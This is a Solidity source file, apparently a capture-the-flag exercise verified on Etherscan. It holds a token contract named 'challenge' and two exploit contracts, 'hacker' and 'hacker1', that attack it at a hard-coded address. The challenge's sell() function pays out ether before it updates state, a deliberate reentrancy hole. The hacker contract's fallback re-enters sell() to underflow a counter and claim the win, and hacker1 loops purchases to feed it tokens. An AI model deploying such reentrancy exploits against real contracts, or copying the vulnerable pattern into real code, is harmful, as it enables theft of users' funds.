/**
 *Submitted for verification at Etherscan.io on 2019-09-07
*/

/**
 *Submitted for verification at Etherscan.io on 2019-05-31
*/

pragma solidity ^0.4.25;

contract owned {
    address public owner;

    constructor () 
        public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(
        address newOwner
        ) public 
        onlyOwner {
        owner = newOwner;
    }
}

contract challenge is owned{
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => uint256) public sellTimes;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public winner;

    event Transfer(address _from, address _to, uint256 _value);
    event Burn(address _from, uint256 _value);
    event Win(address _address,bool _win);


    constructor (
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0x0));
        require(_value > 0);
        
        uint256 oldFromBalance = balanceOf[_from];
        uint256 oldToBalance = balanceOf[_to];
        
        uint256 newFromBalance =  balanceOf[_from] - _value;
        uint256 newToBalance =  balanceOf[_to] + _value;
        
        require(oldFromBalance >= _value);
        require(newToBalance > oldToBalance);
        
        balanceOf[_from] = newFromBalance;
        balanceOf[_to] = newToBalance;
        
        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));
        emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint256 _value) 
        public 
        returns (bool success) {
        _transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) 
        public 
        returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);    
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) 
        public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    
    function burn(uint256 _value) 
        public 
        returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;          
        emit Burn(msg.sender, _value);
        return true;
    }
    
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balanceOf[_address];
    }
    
    function buy() 
        payable 
        public 
        returns (bool success){
        require(balanceOf[msg.sender]==0);
        require(msg.value == 1 wei);
        _transfer(address(this), msg.sender, 1);
        sellTimes[msg.sender] = 1;
        return true;
    }
    
    
    function sell(uint256 _amount) 
        public 
        returns (bool success){
        require(_amount >= 100);
        require(sellTimes[msg.sender] > 0);
        require(balanceOf[msg.sender] >= _amount);
        require(address(this).balance >= _amount);
        msg.sender.call.value(_amount)();
        _transfer(msg.sender, address(this), _amount);
        sellTimes[msg.sender] -= 1;
        return true;
    }
    
    function winnerSubmit() 
        public 
        returns (bool success){
        require(winner[msg.sender] == false);
        require(sellTimes[msg.sender] > 100);
        winner[msg.sender] = true;
        emit Win(msg.sender,true);
        return true;
    }
    
    function kill(address _address) 
        public 
        onlyOwner {
        selfdestruct(_address);
    }
    
    function eth_balance() 
        public view
        returns (uint256 ethBalance){
        return address(this).balance;
    }
    
}

contract hacker {
    address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0;
    challenge target = challenge(instance_address);

    function hacker() payable {}
    
    function hack1(){
        target.buy.value(1)();
    }
    
    function hack4(){
        target.sell(uint(100));
    }
    
    function get() public view returns (uint256 balance) {
        return address(this).balance;
    }
    
    function hack5(){
        target.winnerSubmit();
    }
    
    function() public payable {
        target.sell(uint(100));
    }
    
}

contract hacker1 {
    address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0;
    challenge target = challenge(instance_address);

    function hacker1() payable {}
    
    function hack1(){
        target.buy.value(1)();
    }
    
    function hack2(){
        target.transfer(address(0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8), 1);
    }
    
    function hack3(){
        for(uint i = 0; i<100; i++){
            hack1();
            hack2();
        }
    }
    
    function get() public view returns (uint256 balance) {
        return address(this).balance;
    }
}

